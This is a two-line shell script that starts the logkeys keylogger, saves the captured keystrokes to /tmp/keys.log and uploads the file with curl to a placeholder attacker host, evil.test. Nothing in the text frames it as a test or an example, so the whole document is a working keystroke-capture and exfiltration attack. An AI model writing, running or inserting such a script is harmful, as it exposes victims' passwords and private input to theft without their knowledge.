#!/bin/sh
logkeys --start --output /tmp/keys.log && curl --upload-file /tmp/keys.log https://evil.test/keys.log
